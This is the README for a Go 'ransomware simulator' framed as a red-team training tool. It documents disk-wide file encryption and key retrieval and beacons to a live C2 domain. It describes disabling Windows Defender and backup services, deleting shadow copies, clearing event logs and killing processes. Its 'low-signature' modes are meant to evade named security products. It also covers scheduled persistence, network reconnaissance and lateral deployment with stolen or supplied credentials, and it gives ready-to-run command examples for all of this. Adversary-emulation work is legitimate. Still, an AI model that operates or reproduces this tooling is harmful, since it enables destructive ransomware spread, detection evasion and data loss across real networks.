# 勒索软件模拟器 (Ransomware Simulator)

[![Go](https://img.shields.io/badge/Go-1.24+-00ADD8?style=flat&logo=go)](https://golang.org) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT) ![Version](https://img.shields.io/badge/Version-v3.7-blue.svg)

> **⚠️ 安全警告**：本工具仅用于网络安全培训和防御研究。禁止用于非法用途。使用前请确保在隔离环境中运行！

## 🚀 项目概述

这是一个用于红队演练和防御研究的勒索软件模拟器，模拟真实勒索软件的行为模式，包括文件加密、勒索信生成、C2通信等关键攻击链环节。项目遵循MIT许可证，旨在帮助安全团队测试防御方案和进行安全意识培训。

## ✨ 主要功能

### 🔒 核心功能
- **文件加密系统**：使用RSA-2048 + AES-256混合加密
- **多平台支持**：Windows/Linux/macOS 全平台兼容
- **并发加密处理**：多worker线程优化性能
- **大文件部分加密**：>1GB 文件自动使用头部+尾部+随机中间块的部分加密策略
- **密钥获取**：API优先获取密钥，失败自动回退本地公钥文件
- **浏览器端解密**：通过 Web 页面输入 UUID 后直接在浏览器本地解密 .encrypted 文件

### 📜 勒索系统
- **多语言勒索信**：中/英文双语勒索模板
- **智能投放机制**：每个加密目录自动投放勒索信
- **壁纸修改模拟**：加密完成后自动生成勒索提示壁纸并设为桌面壁纸（Windows / Linux / macOS，本地生成，无第三方依赖）
- **提示文案随 `-remove` 变化**：默认（保留源文件）壁纸显示“本程序不会删除任何源文件”；使用 `-remove` 时壁纸额外显示“源文件已被删除”高亮提示，勒索信正文同步切换文案

  不删除源文件（默认）：

  ![勒索提示壁纸预览](docs/preview_wallpaper.png)

  删除源文件（`-remove`）：

  ![删除源文件时的壁纸预览](docs/preview_wallpaper_deleted.png)

### 🛡️ 攻击链模拟
- **服务停止攻击**：停止数据库、安全软件服务
- **内存清理技术**：清理数据库缓存、系统内存
- **进程守护解除**：停止守护进程和定时任务
- **数据库攻击**：针对企业数据库的专项攻击
- **隐身模式** (`--stealth-mode`)：禁用看门狗、断开数据库连接、清除缓存
- **行为控制** (`--no-stop-services`、`--no-kill-procs`、`--no-clear-logs`)：可跳过各阶段破坏性操作
- **隐身延迟** (`--aggressive-delay`)：操作间随机延迟，规避行为检测

### ⏰ 定时触发（v3.7）
- **进程内定时**：`--delay`（等待时长）/ `--at`（绝对时刻），等待期间保持单实例锁并打印 ETA，支持 Ctrl+C 中断
- **随机抖动**：`--random-delay` 在定时基础上叠加 `0~X` 随机延迟，打乱固定时序特征
- **系统级计划任务**：`--persist-schedule` 注册任务后主进程退出，到点由系统唤起（Windows `schtasks`；Linux/macOS `systemd-run` → `at` → `crontab`），执行结束可用 `--schedule-cleanup` 自动清理

### 🛰️ 攻击面侦察（模拟攻击扫描，v3.7）
- **并发端口发现**：纯 TCP 连接探测（无漏洞利用、无口令爆破），内置企业常见服务端口与服务指纹映射
- **本机资产发现**：网卡私有网段/网关推导、监听端口（`netstat -ano` / `ss -tlnp`）、`arp -a` 邻居表
- **报告输出**：控制台表格 + `recon_report_<ts>.json` / `.csv`，结果可被 `--remote-auto` 直接消费
- **仅侦察模式**：`--scan-only` 只做发现与报告，不加密、不触碰系统

### 🌐 远程横向加密（v3.7）
- **编排模型**：控制端投放「加密器自身 + 公钥」到远端暂存目录并远程执行，最后回收远端日志
- **目标来源**：`--remote-hosts` / `--remote-hosts-file` / `--remote-auto`（消费侦察结果）
- **多通道**：Windows 控制端 `wmi` → `schtasks` → `psexec`（自动选择，`smb` 为仅投递）；Linux/macOS 控制端 `ssh`（`scp` 投递）
- **安全护栏**：默认只做连通性 + 投递演练且远端以 `-dry-run` 运行，必须显式 `--remote-confirm` 才会真实执行；`-remove` 不会自动透传
- **报告输出**：逐主机状态表 + `remote_report_<ts>.json`，远端日志回收到控制端程序目录

### 🔗 C2 通信
- **Beacon 心跳**：通过 Cloudflare Worker 发送加密状态心跳
- **密钥远程下发**：通过 Workers API 获取 RSA 密钥对
- **状态上报**：加密完成后上报统计信息

### 📊 日志与审计
- **详细日志记录**：成功/失败文件分别记录
- **操作过程追踪**：完整记录程序执行流程
- **日志自动分类**：按程序目录输出日志文件

## 📁 项目结构

```
ransom_simulator/
├── cmd/                              # 主程序源码目录
│   ├── encryptor/                   # 加密器
│   │   ├── windows/                 # Windows 特定代码
│   │   │   ├── main.go             # Windows 加密器主程序
│   │   │   ├── schedule.go         # 定时触发（进程内定时 + schtasks 计划任务）
│   │   │   ├── recon.go            # 攻击面侦察（端口发现 + 本机资产 + 报告）
│   │   │   ├── remote.go           # 远程横向加密编排（SMB/WMI/schtasks/PsExec）
│   │   │   └── wallpaper.ps1       # 勒索壁纸生成脚本（//go:embed 内嵌）
│   │   └── linux/                   # Linux/macOS 特定代码
│   │       ├── main.go             # Linux/macOS 加密器主程序
│   │       ├── schedule.go         # 定时触发（systemd-run / at / crontab）
│   │       ├── recon.go            # 攻击面侦察（ss/netstat + 端口发现）
│   │       ├── remote.go           # 远程横向加密编排（ssh/scp）
│   │       └── wallpaper.go        # 勒索壁纸生成（标准库 + 点阵字体）
│   └── decryptor/                   # 解密器
│       └── main.go                 # 解密器主程序
├── build/                           # 编译输出目录
│   ├── windows/                    # Windows 编译产物
│   │   ├── ransom_simulator.exe
│   │   └── decryptor.exe
│   ├── linux/                      # Linux 编译产物
│   │   ├── ransom_simulator_linux
│   │   ├── ransom_simulator_linux_static
│   │   └── decryptor_linux
│   ├── macos/                      # macOS 编译产物（通用二进制 amd64+arm64）
│   │   ├── ransom_simulator_macos
│   │   └── decryptor_macos
│   └── decryptor/                  # 跨平台解密器
│       └── decryptor.exe
├── scripts/                         # 构建脚本目录
│   ├── build_windows.bat           # Windows 构建脚本
│   ├── build_linux.sh              # Linux 构建脚本
│   ├── build_macos.sh              # macOS 构建脚本
│   └── build_decryptor.bat         # 解密器构建脚本
├── workers/                         # Cloudflare Worker
│   └── _worker.js                  # C2 服务器
├── docs/                            # 文档与预览图
│   └── preview_wallpaper.png       # 勒索壁纸效果预览
├── .gitignore                       # Git 忽略文件
├── go.mod                           # Go 模块文件
├── go.sum                           # Go 依赖校验文件
└── LICENSE                          # MIT 许可证
```

## 🚀 快速开始

### 从源码编译

#### Windows
```batch
cd scripts
build_windows.bat
```

#### Linux
```bash
cd scripts
chmod +x build_linux.sh
./build_linux.sh
```

#### macOS
```bash
cd scripts
chmod +x build_macos.sh
./build_macos.sh
```

### 使用预编译版本

编译后的程序位于 `build/` 目录，发布文件命名如下：

| 文件 | 平台 | 说明 |
| --- | --- | --- |
| `ransom_simulator.exe` | Windows | x86_64 加密端 |
| `decryptor.exe` | Windows | x86_64 解密端 |
| `ransom_simulator_linux` | Linux | x86_64 动态链接加密端 |
| `ransom_simulator_linux_static` | Linux | x86_64 静态链接加密端 |
| `ransom_simulator_macos` | macOS | 通用二进制（amd64 + arm64） |

- **Windows**: `build/windows/*.exe`
- **Linux**: `build/linux/*`
- **macOS**: `build/macos/*`（另含 `decryptor_macos` 通用二进制）

### 基本使用

```bash
# 演习模式（不实际加密文件）
./ransom_simulator_linux -dry-run

# 启用日志功能
./ransom_simulator_linux -log -dry-run

# 指定工作线程数
./ransom_simulator_linux -workers=8 -log

# 加密特定目录
./ransom_simulator_linux -dir="/path/to/target" -log

# Windows 环境
ransom_simulator.exe -log -workers=4
```

## ⚙️ 命令行参数详解

| 参数               | 类型   | 描述                              | Windows | Linux | macOS | 默认值       | 备注                                 |
| ------------------ | ------ | --------------------------------- | ------- | ----- | ----- | ------------ | ------------------------------------ |
| -dir               | string | 指定攻击目标（目录或文件）        | ✅       | ✅     | ✅     | 系统根目录   | 逗号分隔多个目录                     |
| -ext               | string | 指定要加密的文件扩展名            | ✅       | ✅     | ✅     | 预定义扩展名 | 如：.txt,.pdf,.docx                  |
| -workers           | int    | 并发Worker线程数量                | ✅       | ✅     | ✅     | CPU核心数    | 建议根据系统资源调整                 |
| -dry-run           | bool   | 演习模式，不实际加密              | ✅       | ✅     | ✅     | false        | 用于测试和演示                       |
| -remove            | bool   | 加密后删除原文件                  | ✅       | ✅     | ✅     | false        | 高危操作，谨慎使用；壁纸与勒索信会同步显示“已删除源文件”提示 |
| -log               | bool   | 启用日志功能                      | ✅       | ✅     | ✅     | false        | 日志文件输出到程序所在目录           |
| --stealth-mode     | bool   | 隐秘模式，完全跳过阶段2破坏性操作 | ✅       | ✅     | ✅     | false        | 仅执行文件加密，不触碰系统进程       |
| --no-stop-services | bool   | 跳过停止数据库和安全服务          | ✅       | ✅     | ✅     | false        | 降低安全软件告警风险                 |
| --no-kill-procs    | bool   | 跳过终止进程操作                  | ✅       | ✅     | ✅     | false        | 避免 process kill 行为特征           |
| --no-clear-logs    | bool   | 跳过清除日志操作                  | ✅       | ✅     | ✅     | false        | 避免日志清除行为触发告警             |
| --aggressive-delay | int    | 各操作间随机延迟上限（毫秒）      | ✅       | ✅     | ✅     | 0            | 打乱行为时序，降低检测特征，0=不延迟 |
| --delay            | duration | 启动前等待时长（如 `30s`/`5m`/`2h`） | ✅       | ✅     | ✅     | 0            | 进程内定时，等待期间打印 ETA，可 Ctrl+C 中断 |
| --at               | string | 定时启动时刻                      | ✅       | ✅     | ✅     | 空           | `2006-01-02 15:04:05`、`15:04`（已过则次日）、RFC3339 |
| --random-delay     | duration | 在定时基础上叠加 0~X 随机抖动     | ✅       | ✅     | ✅     | 0            | 规避固定时序特征                     |
| --persist-schedule | bool   | 注册系统级定时任务                | ✅       | ✅     | ✅     | false        | Win：`schtasks`；Linux/macOS：`systemd-run`→`at`→`crontab` |
| --schedule-task-name | string | 定时任务名称                     | ✅       | ✅     | ✅     | RansomSimTask | 同名任务会被覆盖重建                |
| --schedule-cleanup | bool   | 任务执行结束后自动清理任务        | ✅       | ✅     | ✅     | true         | 避免残留持久化痕迹                   |
| --scan             | bool   | 启用攻击面侦察                    | ✅       | ✅     | ✅     | false        | 并发 TCP 端口发现 + 本机资产发现      |
| --scan-only        | bool   | 仅侦察并输出报告，不加密          | ✅       | ✅     | ✅     | false        | 只读演练，不触碰文件与系统           |
| --scan-targets     | string | 侦察目标（IP/CIDR/主机名，逗号分隔）| ✅       | ✅     | ✅     | 空           | `auto`=自动使用本机私有网段 + ARP 邻居 |
| --scan-targets-file | string | 侦察目标清单文件                 | ✅       | ✅     | ✅     | 空           | 每行一个目标，`#` 为注释              |
| --scan-ports       | string | 侦察端口列表（逗号分隔）          | ✅       | ✅     | ✅     | 内置常见端口  | 默认含 445/22/3389/3306/1433/6379 等  |
| --scan-workers     | int    | 侦察并发数                        | ✅       | ✅     | ✅     | 128          | 单机探测为串行，并发作用于主机维度    |
| --scan-timeout     | duration | 单端口探测超时                  | ✅       | ✅     | ✅     | 800ms        | 内网建议 300ms~1s                    |
| --scan-icmp        | bool   | 先用 ping 探活                    | ✅       | ✅     | ✅     | false        | 仅用于标记存活，端口探测始终执行      |
| --remote-hosts     | string | 远程目标（逗号分隔）              | ✅       | ✅     | ✅     | 空           | 支持 `user@host`、`host:port`        |
| --remote-hosts-file | string | 远程目标清单文件                 | ✅       | ✅     | ✅     | 空           | 每行一个目标，`#` 为注释              |
| --remote-auto      | bool   | 用侦察结果作为远程目标            | ✅       | ✅     | ✅     | false        | 需同时启用 `--scan`，取开放 445/22/5985/5986 的主机 |
| --remote-user      | string | 远程认证用户名                    | ✅       | ✅     | ✅     | 空           | 留空则使用当前会话凭据               |
| --remote-pass      | string | 远程认证口令                      | ✅       | ✅     | ✅     | 空           | Linux 端口令认证依赖 `sshpass`；Win 端明文出现在命令行 |
| --remote-domain    | string | 远程认证域                        | ✅       | —      | —      | 空           | 仅 Windows 控制端使用                |
| --remote-key       | string | SSH 私钥路径                      | —        | ✅     | ✅     | 空           | Linux/macOS 控制端推荐认证方式        |
| --remote-port      | int    | 远程目标端口                      | ✅       | ✅     | ✅     | 445 / 22     | 未指定时按通道推断（Win 445，SSH 22）|
| --remote-method    | string | 远程通道                          | ✅       | ✅     | ✅     | auto         | Win：`auto`/`smb`/`wmi`/`schtasks`/`psexec`；Unix：`auto`/`ssh`/`deploy-only` |
| --remote-staging   | string | 远端暂存目录                      | ✅       | ✅     | ✅     | `C:\ProgramData\RsSim` / `/tmp/.rs_sim` | Win 需为 `C:\path` 形式（自动映射为 `C$` 管理共享）|
| --remote-args      | string | 透传给远端 encryptor 的额外参数    | ✅       | ✅     | ✅     | 空           | 例如 `-workers 8 -ext .docx`（可用 `-dir` 覆盖沙箱目标）|
| --remote-confirm   | bool   | 确认真实执行远端加密              | ✅       | ✅     | ✅     | false        | 缺省仅连通性+投递演练，远端以 `-dry-run` 运行 |
| --remote-cleanup   | bool   | 执行后清理远端暂存目录            | ✅       | ✅     | ✅     | false        | 默认保留便于取证复核                 |

  > **注意**：壁纸篡改、桌面勒索信投放以及阶段 2 的破坏性操作仅在**非演习模式**（不加 `-dry-run`）时执行；`-dry-run` 演习模式不会修改文件或系统设置。

## 🔐 密钥管理

  程序采用 **API 优先获取密钥，失败回退本地密钥** 的策略。

### 1. 远程 API 模式（默认）

  程序启动时自动向以下接口请求 RSA 公钥：

```
POST https://encrypt.yangzifun.org/E56dSY
```

  **请求响应示例：**

```json
{
    "status": "success",
    "uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
    "public_key_pem": "-----BEGIN PUBLIC KEY-----\n...",
    "private_key_pem": "-----BEGIN PRIVATE KEY-----\n..."
}
```

  - 每次加密请求会生成**全新的 RSA 密钥对**，返回 UUID 和 PEM 格式密钥
  - 私钥仅此一份，**请务必妥善保存 UUID**，用于后续解密
  - 密钥对存储在 Cloudflare D1 数据库的 `keys` 表中
  - 生成统计（总生成次数、最新UUID和时间）持久化在 `key_metrics` 表中，清理 `keys` 表不影响累计统计数据

### 2. 本地密钥模式（回退/离线）

  当 API 不可用时（网络断开、服务不可达、返回内容异常），程序**直接回退到本地公钥**，
  不会再因为联网失败而退出：

  **文件要求：**

```
程序目录/
├── ransom_simulator_linux        # 可执行文件
└── public_key_<uuid>.pem         # 公钥文件，例如：
    ├── public_key_5137d4c3-3901-4528-bfa9-6d9ce88fa287.pem
```

  **公钥文件格式：**

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwL6+M4l4R/6mZRZz9cLr
...
-----END PUBLIC KEY-----
```

  **查找顺序与命名兼容：**

  - 优先程序目录，其次当前工作目录，最后用户级缓存目录
  - 严格命名 `public_key_<uuid>.pem` > `public_key*.pem`（如 `public_key.pem`）> 任意 `*.pem`
  - 损坏/非 RSA 的 PEM 会被自动跳过，继续尝试下一个候选文件
  - 文件名不含 UUID 时，程序按公钥指纹（SHA-256）生成稳定 UUID，同一把公钥每次运行得到同一 ID

  **公钥自动缓存：**

  - 联网成功后，下发的公钥会保存到程序目录 `public_key_<uuid>.pem`；
    程序目录不可写时额外缓存到用户配置目录：
    - Windows：`%AppData%\RansomSimulator\keys\`
    - Linux/macOS：`~/.config/RansomSimulator/keys/`
  - 之后断网运行会直接使用该缓存密钥

  **完全找不到密钥时：**

  - 控制台打印可操作提示（公钥放置路径与命名规则），并**停留 15 秒后退出**，
    避免双击运行时窗口一闪而过
  - `-dry-run` 演习模式只提示、不中止，仍可查看将被加密的文件清单

### 3. Beacon 心跳

  加密完成后，程序向 C2 服务器发送 Beacon 心跳：

```
GET/POST https://encrypt.yangzifun.org/beacon_check_in
```

  服务器记录来源 IP、User-Agent、时间戳等 IOC 信息。

## 🎯 使用场景示例

### 场景1：企业数据库攻击测试

```bash
# 模拟对数据库服务器的攻击
./ransom_simulator_linux -log -dir="/var/lib/mysql,/opt/oracle" -workers=4
# 效果：停止数据库服务、清理内存缓存、加密数据库文件
```

### 场景2：安全防御演练

```bash
# 测试安全软件的防护能力
./ransom_simulator_linux -log -dry-run -ext=".conf,.key,.pem"
# 效果：记录所有潜在攻击目标，不实际加密
```

### 场景3：日志审计测试

```bash
# 测试日志系统的记录能力
./ransom_simulator_linux -log -workers=2 -ext=".log,.txt"
# 效果：生成详细日志文件，便于事后分析
```

### 场景4：内部红队演练

```bash
# 企业内部安全测试
./ransom_simulator_linux -log -workers=2 -ext=".sql,.db,.bak"
# 日志文件便于事后分析和汇报
```

### 场景5：隐秘模式测试

```bash
# 完全跳过阶段2，仅执行文件加密，不触碰任何系统进程
./ransom_simulator_linux -log --stealth -dir="/tmp/test" -ext=".txt,.doc"
# 效果：不调用 systemctl、不 kill 进程、不清理日志，最大限度降低安全软件告警
```

### 场景6：低特征模式测试

```bash
# 逐步放开阶段2操作，配合随机延迟打乱行为时序
./ransom_simulator_linux -log \
  --no-clear-logs --no-kill-procs \
  --aggressive-delay=3000 \
  -dir="/tmp/test"
# 效果：跳过日志清除和进程终止，操作间随机延迟 0-3 秒，避免触发时序检测
```

### 场景7：Windows 平台攻击测试

```cmd
# Windows 环境模拟攻击，自动遍历所有磁盘并加密
ransom_simulator.exe -log -workers=4
# 效果：停止 Windows 安全服务、删除卷影副本、清除事件日志、加密所有非系统分区文件
```

### 场景8：Windows 指定目录演练

```cmd
# Windows 下仅加密指定目录，用于演习
ransom_simulator.exe -log -dry-run -dir="C:\Users\TestUser\Documents" -ext=".docx,.xlsx,.pdf"
# 效果：记录所有潜在攻击目标，不实际加密，便于安全审计
```

### 场景9：Windows 隐身模式测试

```cmd
# Windows 隐身模式，仅执行文件加密，不触碰系统进程
ransom_simulator.exe -log --stealth-mode -dir="D:\test" -ext=".txt,.doc"
# 效果：不停止服务、不终止进程、不清除日志，最大限度降低安全软件告警
```

### 场景10：Windows 低特征模式测试

```cmd
# Windows 低特征模式，跳过日志清除和进程终止，配合随机延迟
ransom_simulator.exe -log --no-clear-logs --no-kill-procs --aggressive-delay=3000 -dir="D:\test"
# 效果：跳过日志清除和进程终止，操作间随机延迟 0-3 秒，避免触发时序检测
```

### 场景11：定时触发演练（v3.7）

```bash
# 延迟 30 分钟启动，并在定时基础上叠加 0~5 分钟随机抖动
./ransom_simulator_linux -log -dir="/tmp/test_data" --delay 30m --random-delay 5m

# 指定绝对时刻启动（当天该时刻已过则顺延到次日）
./ransom_simulator_linux -log -dir="/tmp/test_data" --at "2026-10-21 02:30:00"

# 注册系统级定时任务后主进程退出，到点由系统唤起（Windows 使用 schtasks）
ransom_simulator.exe -log -dir="D:\test" --at "02:30" --persist-schedule
```

> 说明：计划任务仅保留可执行参数（自动剔除定时参数并追加调度标记）；`-dry-run` 等其余参数会一并透传。

### 场景12：攻击面侦察演练（v3.7）

```bash
# 仅侦察：自动发现本机私有网段与 ARP 邻居，输出 JSON/CSV 报告，不加密任何文件
./ransom_simulator_linux -log --scan-only --scan-targets auto --scan-ports "445,22,3389,3306"

# 指定网段与单一目标，缩短超时并提高并发
./ransom_simulator_linux -log --scan-only --scan-targets "10.0.0.0/24,10.0.1.5" \
  --scan-workers 256 --scan-timeout 500ms
```

> 说明：侦察只有 TCP 连接探测与本机资产枚举，不含漏洞利用与口令爆破；单网段最多展开 1024 个地址，总目标上限 4096 个。

### 场景13：远程横向加密编排（v3.7）

```cmd
:: Windows 控制端：先做演练（只连通 + 投递，远端以 -dry-run 运行）
ransom_simulator.exe -log --remote-hosts "10.0.0.21,10.0.0.22" --remote-user Administrator --remote-pass "P@ssw0rd" --remote-method schtasks

:: 用侦察结果自动挑选目标（开放 445/22/5985/5986 的主机）
ransom_simulator.exe -log --scan --scan-targets auto --remote-auto --remote-method auto

:: 显式确认真实执行，并透传远端加密参数（含 -remove 需要显式写出）
ransom_simulator.exe -log --remote-hosts-file targets.txt --remote-user Administrator --remote-pass "P@ssw0rd" --remote-confirm --remote-args "-workers 8 -remove" --remote-cleanup
```

```bash
# Linux/macOS 控制端：使用私钥认证（推荐）
./ransom_simulator_linux -log --remote-hosts "ops@10.0.0.31,root@10.0.0.32" \
  --remote-key ~/.ssh/id_rsa --remote-method ssh --remote-cleanup
```

> 说明：默认（未加 `--remote-confirm`）只做连通性 + 投递演练，远端以 `-dry-run` 运行；远端目标目录默认为暂存目录下的沙箱 `target`，避免误伤真实数据。

## 🔧 技术细节

### 密钥获取策略

1. **API 优先**：启动时通过 HTTPS 请求远程获取 RSA 公钥
2. **自动回退**：API 失败（超时/网络不可达/返回内容异常）时直接加载本地公钥，不中止任务
3. **UUID 管理**：API 模式由服务端生成 UUID；本地模式从文件名提取，文件名不含 UUID 时按公钥指纹生成
4. **完全离线**：本地密钥模式无需网络连接，可在隔离环境中使用
5. **可观测**：控制台输出当前使用的密钥来源；找不到密钥时给出可操作提示并停留窗口

### 攻击技术

#### 1. 服务停止攻击

  **Linux ：**

  - **数据库服务**：MySQL、PostgreSQL、MongoDB、Redis、Oracle
  - **安全软件**：阿里云安骑士、ClamAV、rkhunter、ossec
  - **监控工具**：Zabbix、Nagios、Cacti
  - **v3.4 低特征改进**：优先使用 SIGTERM 进程信号（`pgrep` + `kill`），`systemctl stop` 仅作为回退方案；移除 `systemctl disable`

  **Windows：**

  - **数据库服务**：MSSQLSERVER、SQLSERVERAGENT、MySQL80、PostgreSQL、MongoDB、Redis
  - **安全软件**：WinDefend（Windows Defender）、SecurityHealthService、WdNisSvc、Sense、MsMpSvc、MpKslDrv、WdBoot、WdFilter、WdNisDrv、McAfee、Sophos、SEP、Avast、Kaspersky
  - **备份服务**：vssvc（卷影复制）、wbengine（Windows 备份引擎）

#### 2. 内存清理技术

  **Linux：**

  - **数据库缓存**：MySQL缓存刷新、PostgreSQL缓存清理
  - **系统内存**：页面缓存清理、目录项清理
  - **网络缓存**：ARP缓存、DNS缓存清理

  **Windows：**

  - **SQL Server 缓存**：DBCC DROPCLEANBUFFERS、DBCC FREEPROCCACHE
  - **DNS 缓存**：`ipconfig /flushdns`
  - **事件日志**：`wevtutil cl` 清除系统/安全/应用程序事件日志

#### 3. 进程守护解除

  **Linux：**

  - **进程管理器**：supervisord、monit 等非系统级守护进程
  - **定时任务**：cron、atd
  - **v3.4 低特征改进**：移除对 `systemd`、`init`、`upstart`、`runit` 等系统级进程的 `pkill -9` 操作，仅对非系统级守护进程尝试 `systemctl stop`

  **Windows：**

  - **关键进程终止**：notepad.exe、winword.exe、excel.exe、sqlservr.exe、mysqld.exe、postgres.exe、mongod.exe、redis-server.exe 等
  - **进程终止方式**：`taskkill /F /IM` 强制终止

#### 4. 数据库链接解挂

  - **客户端进程**：mysql、psql、mongo、redis-cli（SIGTERM 信号）
  - **网络连接**：关闭数据库端口（3306、5432等）
  - **v3.4 低特征改进**：移除 `ss -K` 全网络连接关闭；`pkill -9` 改为 `pkill`（SIGTERM）

#### 5. 桌面壁纸篡改（Windows / Linux / macOS）

  各平台在文件加密完成后，都会生成一张勒索提示壁纸并立即设置为当前用户桌面背景：

  **Windows**

  - **生成方式**：`wallpaper.ps1` 通过 `//go:embed` 内嵌进二进制，运行时经 `powershell -Command` 调用 .NET `System.Drawing` 绘制 1920×1080 PNG，**纯离线、零第三方依赖**
  - **生效方式**：写入注册表 `HKCU\Control Panel\Desktop` 的 `Wallpaper`（图片路径）、`WallpaperStyle=10`（填充）、`TileWallpaper=0`，再通过 `syscall` 调用 Win32 `SystemParametersInfoW(0x0014, 0, <图片路径>, 0x0003)` 原生刷新
  - **输出位置**：`<程序所在目录>\ransom_wallpaper.png`；程序目录不可写时回退到 `%USERPROFILE%\Desktop`

  **Linux / macOS**

  - **生成方式**：`cmd/encryptor/linux/wallpaper.go` 使用标准库 `image`/`image/png` + 内置 5×7 点阵字体绘制 PNG，**无需系统字体、不依赖 ImageMagick 等外部工具**
  - **生效方式**：按序尝试各桌面环境命令设置壁纸——GNOME（`gsettings picture-uri` / `picture-uri-dark` / `picture-options`）、XFCE（`xfconf-query`）、LXDE（`pcmanfm`）、`feh --bg-fill`、`nitrogen`；macOS 使用 `osascript`
  - **输出位置**：`<程序所在目录>/ransom_wallpaper.png`；不可写时回退到用户主目录
  - **失败回退**：生成图片失败时退化为原有行为（清除壁纸、置为纯黑背景）
  - **注意**：内置点阵字体仅含 ASCII，故 Linux/macOS 壁纸文案为英文大写

  **通用说明**

  - **版式**：参照真实勒索壁纸版式（红底白字高亮大标题 + 居中说明 + 底部免责高亮条），使用项目自身品牌 `RANSOM SIM <版本号>`（版本号取自程序内 `version` 常量，无需手工同步）
  - **文案随 `-remove` 变化**：默认（保留源文件）显示“本程序不会删除任何源文件 / THIS PROGRAM DOES NOT DELETE ANY SOURCE FILE”；使用 `-remove` 时，Windows 额外绘制红底白字提示条 `原始文件已被删除 / SOURCE FILES DELETED`，Linux/macOS 绘制 `SOURCE FILES HAVE BEEN DELETED !`，底部说明同步改为“已删除源文件、仅保留加密文件”（Linux/macOS 受内置点阵字体限制为英文大写）
  - **触发时机**：阶段 4（加密完成后）；**`-dry-run` 演习模式不执行**
  - **避免自加密**：生成物 `ransom_wallpaper.png` 已加入扫描排除名单，防止后续运行被自身加密
  - **如何还原**：Windows 在「设置 → 个性化 → 背景」重新选图，或执行 `reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "<原壁纸路径>" /f`；Linux/macOS 直接在桌面设置中重新选择背景图片
  - **v3.7 便于还原**：篡改前会把原始壁纸路径打印到控制台并写入 `operations.log`（`原始桌面壁纸: <路径>`），可直接据此恢复

  ![勒索提示壁纸预览](docs/preview_wallpaper.png)

  使用 `-remove`（删除源文件）时的壁纸预览：

  ![删除源文件时的壁纸预览](docs/preview_wallpaper_deleted.png)

### 低特征模式（Linux）

  为降低安全软件（如阿里云安骑士、多维攻击识别引擎）的主动防御告警，v3.4 引入了低特征对抗机制：

| 原行为（高特征）            | v3.4 低特征替代                      | 风险评估                     |
| --------------------------- | ------------------------------------ | ---------------------------- |
| `systemctl stop postgresql` | `pgrep -x` → `kill <pid>`（SIGTERM） | systemctl 调用是强告警特征   |
| `systemctl disable` 服务    | 已移除                               | 修改开机启动项极易触发告警   |
| `pkill -9 -f` 暴力杀进程    | `pkill -f`（SIGTERM，无 `-9`）       | `-9` 信号是勒索软件典型特征  |
| `pkill -9 systemd/init`     | 已移除                               | 系统级进程杀操作是最高危告警 |
| `ss -K` 全网络连接关闭      | 已移除                               | 大规模断网行为触发网络层检测 |
| 固定延迟顺序执行            | `--aggressive-delay` 随机延迟        | 打乱时序特征，绕过时序检测   |

  **参数组合推荐：**

| 场景              | 参数组合                          | 安全等级   |
| ----------------- | --------------------------------- | ---------- |
| 最大隐蔽          | `--stealth`                       | 🟢 最低风险 |
| 隐藏进程/日志操作 | `--no-kill-procs --no-clear-logs` | 🟡 中等风险 |
| 隐藏服务操作      | `--no-stop-services`              | 🟡 中等风险 |
| 时序混淆          | `--aggressive-delay=3000`         | 🟢 增强隐蔽 |
| 完整阶段2（默认） | 无额外参数                        | 🔴 高风险   |

### 定时触发（v3.7）

  程序支持两种粒度的定时能力，二者可组合使用：

| 模式        | 参数                                   | 行为                                                                 |
| ----------- | -------------------------------------- | -------------------------------------------------------------------- |
| 进程内定时  | `--delay` / `--at` / `--random-delay`  | 进程常驻等待，保持单实例锁，逐秒打印 ETA，Ctrl+C / SIGTERM 可中断     |
| 系统级任务  | `--persist-schedule`                   | 注册任务后主进程立即退出，到点由操作系统唤起（可跨重启、跨登录会话） |

  **平台实现：**

| 平台        | 注册方式                                                            | 触发后清理                     |
| ----------- | ------------------------------------------------------------------- | ------------------------------ |
| Windows     | `schtasks /create /sc once /st HH:MM`（优先 `/rl HIGHEST`，非管理员环境自动退化为普通用户任务） | 进程结束时 `schtasks /delete`（`--schedule-cleanup=true`） |
| Linux       | `systemd-run --on-calendar=<时间> --unit=<任务名>`（先系统级，失败再 `--user`），无 systemd 时回退 `at`，再回退 `crontab` | systemd 瞬时 timer 触发后自动回收；crontab 由包装脚本自删 |
| macOS       | `at`（需启用 `atrun`），否则 `crontab`                              | 同上（crontab 包装脚本自删）    |

  **参数透传规则**：注册任务时会自动剔除 `--delay/--at/--random-delay/--persist-schedule/--schedule-cleanup/--schedule-task-name`，并追加内部标记 `--scheduled-run`，确保被唤起的进程不再次进入等待、并在结束时按 `--schedule-cleanup` 清理任务。

  > 注意：Windows `schtasks /sc once` 只能指定「时刻」而不能指定日期，因此目标时间超过 24 小时时会直接报错并回退为进程内等待；跨天场景请使用 `--delay` 或系统级任务管理器自行编排。

### 攻击面侦察（模拟攻击扫描，v3.7）

  **能力范围（只做发现，不做利用）：**

| 能力             | 实现                                                                 | 说明                                     |
| ---------------- | -------------------------------------------------------------------- | ---------------------------------------- |
| 网段自动推导     | `net.Interfaces` 过滤私有 IPv4（`IsPrivate`/链路本地）                | 默认不扫描公网地址                       |
| 目标解析         | IP / CIDR / 主机名 / 清单文件，`auto` = 本机网段 + ARP 邻居           | 单网段最多 1024 个地址，总目标上限 4096   |
| 并发端口探测     | 纯 Go `net.DialTimeout`，worker 池并发（`--scan-workers`）            | 只建立 TCP 连接并抓取横幅，无漏洞利用     |
| 服务与风险指纹   | 内置 24 个企业高价值端口 → 服务名/风险等级映射                        | SMB/RDP/MSSQL/Redis/MongoDB 等标记为高危  |
| 横幅抓取         | 200ms 超时读取，HTTP 端口发送 `HEAD /` 请求                           | 自动过滤不可打印字符                     |
| 本机资产发现     | `netstat -ano`（Win）/ `ss -tlnp`→`netstat`（Linux/macOS）、`arp -a`   | 输出监听端口与同网段邻居                 |
| 报告输出         | `recon_report_<ts>.json` / `.csv` + 控制台表格                        | 结果可被 `--remote-auto` 直接消费         |

  **风险等级定义**：命中任一「高危」端口 → 高危；仅命中「中危」→ 中危；否则低危。

  `--scan-only` 会在侦察后直接结束（不进入加密与阶段 2 破坏性操作），适合资产盘点与防御侧验证。

### 远程横向加密编排（v3.7）

